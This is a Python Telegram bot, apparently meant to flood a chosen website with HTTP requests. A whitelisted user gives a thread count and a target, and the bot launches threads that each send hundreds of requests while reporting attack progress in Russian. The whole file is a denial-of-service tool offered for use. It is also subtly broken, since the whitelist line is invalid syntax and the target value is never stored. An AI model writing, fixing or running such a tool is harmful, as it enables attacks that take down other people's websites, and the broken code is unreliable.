from aiogram import Bot, Dispatcher, executor, types
from aiogram.dispatcher.filters import Text
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.filters.state import StatesGroup, State
from aiogram.utils.exceptions import Throttled
from aiogram.dispatcher import FSMContext
import time
import requests
import socket
from threading import Thread

bot = Bot(token="YOURTOKEN")
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

coutrequests = 0
errorrequests = 0

# whitelist (IDs)
whitelist = [-]

class Attack(StatesGroup):
    thr = State()
    target = State()

@dp.message_handler(commands="start")
async def start(message: types.Message):
    if message.from_user.id not in whitelist:
        await bot.send_message(message.chat.id, "У вас нет доступа к этому боту. | You have no permission to use this bot.")
        return
    await bot.send_message(message.chat.id, "Используйте команду /attack | Use command /attack")
    pass

def dos(site):
    global coutrequests
    global errorrequests
    for _ in range(500):
        try:
            resp = requests.get(site)
            print(resp.status_code)
            coutrequests = coutrequests + 1
            print(coutrequests)
            time.sleep(1)
        except Exception as r:
            errorrequests = errorrequests + 1
            print(f'Ошибка {r}')
            time.sleep(1)

@dp.message_handler(commands="attack")
async def attackstart(message: types.Message):
    if message.from_user.id not in whitelist:
        await bot.send_message(message.chat.id, "У вас нет доступа к этому боту. | You have no permission to use this bot.")
        return
    await bot.send_message(message.chat.id, "Введите количество потоков:")
    await Attack.thr.set()

@dp.message_handler(state=Attack.thr)
async def theard(message: types.Message, state: FSMContext):
    await state.update_data(coutthr=int(message.text))
    await bot.send_message(message.chat.id, "Укажите сайт куда провести атаку:")
    await Attack.next()

@dp.message_handler(state=Attack.target)
async def theards(message: types.Message, state: FSMContext):
    data = await state.get_data()
    thrd = int(data['coutthr'])
    site = data['trg']
    mainmsg = await bot.send_message(message.chat.id, "Проверка...")

    try:
        await mainmsg.edit_text("Запуск потоков...")
        for i in range(int(thrd)):
            th = Thread(target=dos, args=(site,))
            th.start()
            await mainmsg.edit_text(f"Запущено потоков: {i + 1}/{thrd}\n(Скорость запуска потоков ограничена!)")
            time.sleep(0.2)

        text = ""
        for _ in range(110):
            global coutrequests
            global errorrequests
            test = requests.get(site)
            text = f"Все потоки успешно начали атаку!\nЦель: {site}\nКол-во потоков: {thrd}\nРезультаты запросов: {test.status_code}\nВыполнено запросов: {coutrequests}\nОшибок подключения: {errorrequests}\nВремя атаки: 500 секунд\nОбновление сообщения: раз в 5 секунд"
            await mainmsg.edit_text(text=text)
            time.sleep(5)

        await mainmsg.edit_text(text="Завершение потоков...")
        await mainmsg.edit_text(text="Потоки завершены!\nХорошего вам дня.")
        coutrequests = 0
        errorrequests = 0
        await state.finish()
        
    except Exception as err:
        await mainmsg.edit_text(text=f"Ошибка!\n{err}")
        await state.finish()
        
if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)